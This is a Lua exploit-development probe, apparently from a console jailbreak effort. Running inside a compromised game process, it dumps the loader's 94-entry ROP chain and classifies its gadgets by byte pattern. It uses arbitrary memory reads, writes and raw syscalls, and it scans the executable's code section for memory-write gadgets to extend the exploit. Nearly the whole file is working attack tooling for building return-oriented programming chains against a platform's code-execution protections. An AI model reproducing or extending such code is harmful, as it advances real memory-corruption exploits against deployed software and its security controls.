-- CRASH_CLASS: LOW
-- PROBE 127d: Full ROP chain dump + write gadget search
--
-- 127c proved: no syscall instruction and no mov[rdi],rax;ret exist
-- anywhere in eboot's 4.6MB .text. The syscall stub lives in an XO
-- library. But the loader's ROP chain (0x2F0 bytes) contains code
-- addresses — one of them should be the syscall stub or contain it.
--
-- This probe:
-- [A] Dumps all 94 qwords of the ROP chain with labels
-- [B] Classifies each as eboot addr, module addr, or data
-- [C] Searches for mov[rdi],eax;ret (89 07 C3 — 3-byte without REX.W)
-- [D] Searches for other write gadgets in eboot
-- [E] Reads the fn_addr struct in detail

print("=== PROBE 127d: ROP CHAIN DUMP ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid
end

-- Get eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
local text_size = rd(N(info) + 0x110) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
if text_size < 0 then text_size = text_size + 0x100000000 end

local eboot = uint64(string.format("0x%X%08X", text_hi, text_lo))
local E = N(eboot)
local eboot_end = text_lo + text_size
print(string.format("eboot base=0x%X%08X size=0x%X", text_hi, text_lo, text_size))

-- Parse pipe string for addresses
local pipe_str = tostring(syscall.pipe)
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local ret_str = pipe_str:match("fcall_stub%.return_addr: (0x[0-9a-fA-F]+)")

print(string.format("rop_chain = %s", rop_str or "nil"))
print(string.format("fn_addr   = %s", fn_str or "nil"))
print(string.format("ret_addr  = %s", ret_str or "nil"))

if not rop_str then
    print("ERROR: no ropchain address")
    return
end

local rop_addr = uint64(rop_str)
local ROP = N(rop_addr)

-- [A] Full ROP chain dump (0x2F0 / 8 = 94 entries)
print("")
print("[A] ROP chain dump (0x2F0 bytes)")

local eboot_entries = {}
local non_eboot_code = {}

for i = 0, 93 do
    local val = rq(ROP + i * 8)
    if val == nil then break end
    local h, l = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end

    -- Classify: eboot address?
    local is_eboot = (h == text_hi and l >= text_lo and l < eboot_end)
    local eboot_off = is_eboot and (l - text_lo) or nil

    -- Module address? (high nibble in 0-0xF range, low 32 non-zero)
    local is_code = (h > 0 and h < 0x10 and l > 0x10000)

    local tag = ""
    if is_eboot then
        tag = string.format("; eboot+0x%X", eboot_off)
        eboot_entries[#eboot_entries + 1] = {i, eboot_off, fmt(val)}
    elseif is_code then
        tag = "; code?"
        non_eboot_code[#non_eboot_code + 1] = {i, h, l, fmt(val)}
    elseif l == 0 and h == 0 then
        tag = "; zero"
    end

    print(string.format("  [%02d] +0x%03X: %s %s", i, i * 8, fmt(val), tag))
end

if not alive() then print("DIED!") return end

-- [B] Summary of eboot gadgets in chain
print("")
print("[B] Eboot gadgets in chain")
for _, e in ipairs(eboot_entries) do
    local idx, off, addr = e[1], e[2], e[3]
    -- Read bytes at that offset to identify
    local d = rd(E + off) or 0
    if d < 0 then d = d + 0x100000000 end
    local b0 = d % 256
    local b1 = math.floor(d / 256) % 256
    local b2 = math.floor(d / 65536) % 256
    local b3 = math.floor(d / 16777216) % 256
    local label = "?"
    if b0 == 0xC3 then label = "ret"
    elseif b0 == 0x58 and b1 == 0xC3 then label = "pop rax; ret"
    elseif b0 == 0x5F and b1 == 0xC3 then label = "pop rdi; ret"
    elseif b0 == 0x5E and b1 == 0xC3 then label = "pop rsi; ret"
    elseif b0 == 0x5A and b1 == 0xC3 then label = "pop rdx; ret"
    elseif b0 == 0x59 and b1 == 0xC3 then label = "pop rcx; ret"
    elseif b0 == 0x5C and b1 == 0xC3 then label = "pop rsp; ret"
    elseif b0 == 0x5B and b1 == 0xC3 then label = "pop rbx; ret"
    elseif b0 == 0x41 and b1 == 0x58 and b2 == 0xC3 then label = "pop r8; ret"
    elseif b0 == 0x41 and b1 == 0x59 and b2 == 0xC3 then label = "pop r9; ret"
    elseif b0 == 0x41 and b1 == 0x5C and b2 == 0xC3 then label = "pop r12; ret"
    elseif b0 == 0x41 and b1 == 0x5D and b2 == 0xC3 then label = "pop r13; ret"
    elseif b0 == 0x41 and b1 == 0x5E and b2 == 0xC3 then label = "pop r14; ret"
    elseif b0 == 0x41 and b1 == 0x5F and b2 == 0xC3 then label = "pop r15; ret"
    elseif b0 == 0x48 and b1 == 0x89 then
        label = string.format("mov r/m64, reg (%02X %02X %02X %02X)", b0, b1, b2, b3)
    elseif b0 == 0x89 and b1 == 0x07 then
        label = string.format("mov [rdi], eax; ... (%02X %02X %02X %02X)", b0, b1, b2, b3)
    elseif b0 == 0x48 then
        label = string.format("REX.W (%02X %02X %02X %02X)", b0, b1, b2, b3)
    elseif b0 == 0x31 and b1 == 0xC0 and b2 == 0xC3 then label = "xor eax,eax; ret"
    elseif b0 == 0xEB and b1 == 0xFE then label = "jmp $"
    else
        label = string.format("%02X %02X %02X %02X", b0, b1, b2, b3)
    end
    print(string.format("  [%02d] +0x%05X: %s  %s", idx, off, addr, label))
end

-- [C] Non-eboot code addresses (potential module/libkernel gadgets)
print("")
print("[C] Non-eboot code addresses in chain")
for _, e in ipairs(non_eboot_code) do
    local idx, h, l, addr = e[1], e[2], e[3], e[4]
    -- Try reading bytes (will fail if XO)
    local qval = rq(l + h * 0x100000000)
    if qval then
        local bh, bl = get_hi_lo(qval)
        if bl < 0 then bl = bl + 0x100000000 end
        local b0 = bl % 256
        local b1 = math.floor(bl / 256) % 256
        local b2 = math.floor(bl / 65536) % 256
        local b3 = math.floor(bl / 16777216) % 256
        print(string.format("  [%02d] %s: READABLE %02X %02X %02X %02X", idx, addr, b0, b1, b2, b3))
    else
        print(string.format("  [%02d] %s: XO/unreadable", idx, addr))
    end
end

if not alive() then print("DIED!") return end

-- [D] Search eboot for write gadgets
print("")
print("[D] Write gadget search in eboot")

local write_gadgets = {}
-- Search patterns:
-- 89 07 C3       = mov [rdi], eax; ret (3 bytes, no REX.W)
-- 48 89 47 00 C3 = mov [rdi+0], rax; ret (5 bytes)
-- 89 06 C3       = mov [rsi], eax; ret
-- 48 89 06 C3    = mov [rsi], rax; ret
-- 89 03 C3       = mov [rbx], eax; ret
-- 48 89 03 C3    = mov [rbx], rax; ret
-- 48 89 01 C3    = mov [rcx], rax; ret

-- Use read_buffer for speed
local CHUNK = 0x10000
local patterns = {
    {"\x89\x07\xC3", "mov [rdi],eax;ret"},
    {"\x48\x89\x06\xC3", "mov [rsi],rax;ret"},
    {"\x89\x06\xC3", "mov [rsi],eax;ret"},
    {"\x89\x03\xC3", "mov [rbx],eax;ret"},
    {"\x48\x89\x03\xC3", "mov [rbx],rax;ret"},
    {"\x48\x89\x01\xC3", "mov [rcx],rax;ret"},
    {"\x89\x01\xC3", "mov [rcx],eax;ret"},
    {"\x48\x89\x02\xC3", "mov [rdx],rax;ret"},
}

for base_off = 0, text_size - CHUNK, CHUNK do
    local ok, chunk = pcall(function()
        return memory.read_buffer(uint64(string.format("0x%X%08X",
            text_hi, text_lo + base_off)), CHUNK)
    end)
    if not ok or type(chunk) ~= "string" then break end

    for _, p in ipairs(patterns) do
        local pat, label = p[1], p[2]
        local pos = 1
        while true do
            local found = string.find(chunk, pat, pos, true)
            if not found then break end
            local off = base_off + found - 1
            write_gadgets[#write_gadgets + 1] = {off, label}
            pos = found + 1
            if #write_gadgets > 30 then break end
        end
    end
end

if #write_gadgets == 0 then
    print("  NO write gadgets found!")
else
    for _, g in ipairs(write_gadgets) do
        print(string.format("  +0x%X: %s", g[1], g[2]))
    end
end

-- [E] Also check if the ROP chain itself contains a readable
-- memory-store gadget (could be in heap, not eboot)
print("")
print("[E] fn_addr struct detail")
if fn_str then
    local fn = uint64(fn_str)
    local FN = N(fn)
    -- Read 0x40 bytes
    for off = 0, 0x3C, 4 do
        local v = rd(FN + off)
        local vn = v and N(v) or 0
        if vn < 0 then vn = vn + 0x100000000 end
        print(string.format("  fn+0x%02X: 0x%08X", off, vn))
    end
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 127d COMPLETE ===")
